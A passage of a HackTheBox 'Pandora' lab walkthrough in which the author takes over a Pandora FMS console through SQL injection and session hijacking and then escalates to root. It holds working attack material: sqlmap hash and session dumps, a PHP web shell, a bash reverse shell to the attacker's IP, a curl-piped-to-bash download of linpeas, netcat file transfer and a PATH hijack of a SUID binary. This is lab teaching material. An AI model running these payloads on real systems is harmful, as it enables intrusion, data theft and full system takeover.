+</span></span></code></pre></td></tr></table></div></div><ul><li><code>-S</code>: line breaks.</li></ul><p>Now we have:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>matt@pandora.htb f655f807365b6dc602b31ab3d6d43acc
+</span></span><span class=line><span class=cl>daniel@pandora.htb 76323c174bd49ffbbdedf678f6cc89a6
+</span></span></code></pre></td></tr></table></div></div><p>We can do:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -r pandora.req --batch -D pandora -T tsessions_php --dump
+</span></span></code></pre></td></tr></table></div></div><p>To find out the sessions! We will take one:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=p>|</span> g4e01qdgk36mfdh90hvcc54umq <span class=p>|</span> id_usuario<span class=p>|</span>s:4:<span class=s2>&#34;matt&#34;</span><span class=p>;</span>alert_msg<span class=p>|</span>a:0:<span class=o>{}</span>new_chat<span class=p>|</span>b:0<span class=p>;</span> <span class=p>|</span> <span class=m>1638796349</span>  <span class=p>|</span>
+</span></span></code></pre></td></tr></table></div></div><p>And put it in the URL, like so <code>http://localhost:8000/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq</code> and refresh <code>http://localhost:8000/pandora_console/</code>. We get it!</p><p><img src=https://pietraferreira.github.io/quartz//notes/images/Screenshot%20from%202022-07-18%2013-13-50.png width=auto alt></p><p>Matt doesn&rsquo;t seem to be an admin. Let&rsquo;s try some other things.</p><p>We can do:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://localhost:8000/pandora_console/include/chart_generator.php?session_id<span class=o>=</span>1<span class=err>&#39;</span> union <span class=k>select</span> 1-- -
+</span></span></code></pre></td></tr></table></div></div><p>Because we have 3 <code>tsessions_php</code> entries, we enter:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://localhost:8000/pandora_console/include/chart_generator.php?session_id<span class=o>=</span>1<span class=err>&#39;</span> union <span class=k>select</span> 1,2,3-- -
+</span></span></code></pre></td></tr></table></div></div><p>Which gets rid of the error message. Now we can do:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://localhost:8000/pandora_console/include/chart_generator.php?session_id<span class=o>=</span>1%27%20union%20select%201,2,%27id_usuario<span class=p>|</span>s:5:%22admin%22<span class=p>;</span>%27--%20-
+</span></span></code></pre></td></tr></table></div></div><p>And we are in! We can see that the in <code>Admin tools -> File manager</code> we get put in <code>/images/</code>, so lets try to upload something there. The URL is <code>http://localhost:8000/pandora_console/images/</code>. Our shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>                                                                             
+</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]);</span>                                                                                                                                                                                                                   
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>We can upload it, then execute it. It doesn&rsquo;t display anything but we can run <code>http://localhost:8000/pandora_console/images/shell.php?cmd=whoami</code> and we get <code>matt</code>!</p><p>We can open it in <strong>Burp</strong>, send it to the <code>Repeater</code> and convert the request type to <strong>POST</strong>. Then we change <code>cmd</code> to:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>cmd</span><span class=o>=</span>bash -c <span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.12/9001 0&gt;&amp;1&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>Make sure to <code>ctrl+u</code> it to encode it to URL. We are in!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~/htb/pandora &gt; nc -nlvp <span class=m>9001</span>
+</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>9001</span>
+</span></span><span class=line><span class=cl>Connection received on 10.10.11.136 <span class=m>59342</span>
+</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>871<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
+</span></span><span class=line><span class=cl>bash: no job control in this shell
+</span></span><span class=line><span class=cl>matt@pandora:/var/www/pandora/pandora_console/images$ python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class=line><span class=cl>&lt;ges$ python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>  
+</span></span></code></pre></td></tr></table></div></div><p>Then we <code>ctrl+z</code> it and run:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ENTER
+</span></span><span class=line><span class=cl>ENTER
+</span></span></code></pre></td></tr></table></div></div><p>Now we have proper shell.</p><p>We can run <strong>LinPEAS</strong>. We download it, then run a <code>python http</code> server and curl from it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://10.10.14.12:8001/linpeas.sh <span class=p>|</span> bash
+</span></span></code></pre></td></tr></table></div></div><p>There&rsquo;s this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>╔══════════╣ Executing Linux Exploit Suggester
+</span></span><span class=line><span class=cl>╚ https://github.com/mzet-/linux-exploit-suggester
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2021-4034<span class=o>]</span> PwnKit
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+</span></span><span class=line><span class=cl>   Exposure: probable
+</span></span><span class=line><span class=cl>   Tags: <span class=o>[</span> <span class=nv>ubuntu</span><span class=o>=</span>10<span class=p>|</span>11<span class=p>|</span>12<span class=p>|</span>13<span class=p>|</span>14<span class=p>|</span>15<span class=p>|</span>16<span class=p>|</span>17<span class=p>|</span>18<span class=p>|</span>19<span class=p>|</span>20<span class=p>|</span><span class=m>21</span> <span class=o>]</span>,debian<span class=o>=</span>7<span class=p>|</span>8<span class=p>|</span>9<span class=p>|</span>10<span class=p>|</span>11,fedora,manjaro
+</span></span><span class=line><span class=cl>   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+</span></span></code></pre></td></tr></table></div></div><p>From their website: We discovered a Local Privilege Escalation (from any user to root) in
+polkit&rsquo;s pkexec, a SUID-root program that is installed by default on
+every major Linux distribution:</p><p>&ldquo;Polkit (formerly PolicyKit) is a component for controlling system-wide
+privileges in Unix-like operating systems. It provides an organized way
+for non-privileged processes to communicate with privileged ones. [&mldr;]
+It is also possible to use polkit to execute commands with elevated
+privileges using the command pkexec followed by the command intended to
+be executed (with root permission).&rdquo; (Wikipedia)</p><p>So we check for <code>pkexec</code>!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>matt@pandora:/home/matt$ pkexec --version
+</span></span><span class=line><span class=cl>pkexec version 0.105
+</span></span></code></pre></td></tr></table></div></div><p>Nice. We also see:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>╔══════════╣ SUID - Check easy privesc, exploits and write perms
+</span></span><span class=line><span class=cl>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+</span></span><span class=line><span class=cl>strings Not Found
+</span></span><span class=line><span class=cl>-rwsr-x--- <span class=m>1</span> root matt 17K Dec  <span class=m>3</span>  <span class=m>2021</span> /usr/bin/pandora_backup <span class=o>(</span>Unknown SUID binary<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>Matt seems to have access to it.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>matt@pandora:/home/matt$ file /usr/bin/pandora_backup   
+</span></span><span class=line><span class=cl>/usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version <span class=m>1</span> <span class=o>(</span>SYSV<span class=o>)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class=o>[</span>sha1<span class=o>]=</span>7174c3b04737ad11254839c20c8dab66fce55af8, <span class=k>for</span> GNU/Linux 3.2.0, not stripped
+</span></span></code></pre></td></tr></table></div></div><p>We can <code>netcat</code> the file over:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>matt@pandora:/home/matt$ nc 10.10.14.12 <span class=m>9002</span> &lt; /usr/bin/pandora_backup
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>~/htb/pandora &gt; nc -nlvp <span class=m>9002</span> &gt; pandora_backup
+</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>9002</span>
+</span></span><span class=line><span class=cl>Connection received on 10.10.11.136 <span class=m>36352</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>~/htb/pandora &gt; md5sum pandora_backup 
+</span></span><span class=line><span class=cl>172b42e4a9c9de0d155c357c733ff80f  pandora_backup
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>matt@pandora:/home/matt$ md5sum /usr/bin/pandora_backup 
+</span></span><span class=line><span class=cl>172b42e4a9c9de0d155c357c733ff80f  /usr/bin/pandora_backup
+</span></span></code></pre></td></tr></table></div></div><p>However when we try to run it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>matt@pandora:/home/matt$ /usr/bin/pandora_backup 
+</span></span><span class=line><span class=cl>PandoraFMS Backup Utility
+</span></span><span class=line><span class=cl>Now attempting to backup PandoraFMS client
+</span></span><span class=line><span class=cl>tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
+</span></span><span class=line><span class=cl>tar: Error is not recoverable: exiting now
+</span></span><span class=line><span class=cl>Backup failed!
+</span></span><span class=line><span class=cl>Check your permissions!
+</span></span></code></pre></td></tr></table></div></div><p>We can run <strong>strings</strong> on it and find <code>tar</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Now attempting to backup PandoraFMS client
+</span></span><span class=line><span class=cl>tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_consol
+</span></span></code></pre></td></tr></table></div></div><p>So it is vulnerable to path injection. But we can:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>matt@pandora:/home/matt$ <span class=nb>echo</span> /bin/bash &gt; tar
+</span></span><span class=line><span class=cl>matt@pandora:/home/matt$ tar
+</span></span><span class=line><span class=cl>tar: You must specify one of the <span class=s1>&#39;-Acdtrux&#39;</span>, <span class=s1>&#39;--delete&#39;</span> or <span class=s1>&#39;--test-label&#39;</span> options
+</span></span><span class=line><span class=cl>Try <span class=s1>&#39;tar --help&#39;</span> or <span class=s1>&#39;tar --usage&#39;</span> <span class=k>for</span> more information.
+</span></span></code></pre></td></tr></table></div></div><p>We can add our directory to PATH:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>matt@pandora:/home/matt$ <span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span>/home/matt:<span class=nv>$PATH</span> 
+</span></span><span class=line><span class=cl>matt@pandora:/home/matt$ <span class=nb>echo</span> <span class=nv>$PATH</span>                  
+</span></span><span class=line><span class=cl>/home/matt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>matt@pandora:/home/matt$ chmod +x tar
+</span></span><span class=line><span class=cl>matt@pandora:/home/matt$ which tar
+</span></span><span class=line><span class=cl>/home/matt/tar
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>matt@pandora:/home/matt$ /usr/bin/pandora_backup        
+</span></span><span class=line><span class=cl>PandoraFMS Backup Utility
+</span></span><span class=line><span class=cl>Now attempting to backup PandoraFMS client
+</span></span></code></pre></td></tr></table></div></div><p>BAMMN! We can do create a <code>.ssh/</code> dir in matt and then:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh-keygen -f matt
+</span></span></code></pre></td></tr></table></div></div><p>Send it to matt via a <code>python http</code> server. We move it to <code>authorised_keys</code> and then ssh into it.</p><p>Now we can actually do:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>matt@pandora: <span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span><span class=o>=</span><span class=nv>$PATH</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>matt@pandora:/home/matt$ /usr/bin/pandora_backup        
+</span></span><span class=line><span class=cl>PandoraFMS Backup Utility
+</span></span><span class=line><span class=cl>Now attempting to backup PandoraFMS client
+</span></span></code></pre></td></tr></table></div></div><p>And we are root!!</p></article><hr><div class=page-end><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li><a href=/quartz/notes/hackthebox/ data-ctx=Pandora data-src=/notes/hackthebox class=internal-link>HackTheBox</a></li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://pietraferreira.github.io/quartz/js/graph.afdb02e537635f9a611b53a988e5645b.js></script></div></div><div id=contact_buttons><footer><p>Made by Morioh using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, © 2022</p><ul><li><a href=https://pietraferreira.github.io/quartz/>Home</a></li><li><a href=https://github.com/pietraferreira>Github</a></li></ul></footer></div></div></body></html>
